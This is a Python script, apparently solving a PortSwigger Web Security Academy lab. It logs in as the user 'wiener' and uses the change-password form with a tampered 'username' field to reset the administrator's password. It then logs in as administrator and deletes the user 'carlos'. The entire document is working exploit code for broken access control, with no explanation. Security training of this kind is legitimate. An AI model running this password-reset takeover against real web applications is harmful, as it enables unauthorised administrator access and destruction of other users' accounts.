import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
acc_url = burp_url + '/my-account'
change_pass = burp_url + '/my-account/change-password'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

response = session.get(acc_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "administrator", "new-password-1": "11111", "new-password-2": "11111"}
session.post(change_pass, data=burp_data)

response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)
burp_data = {"csrf": csrf, "username": "administrator", "password": "11111"}
session.post(login_url, data=burp_data)
session.get(delete_url)
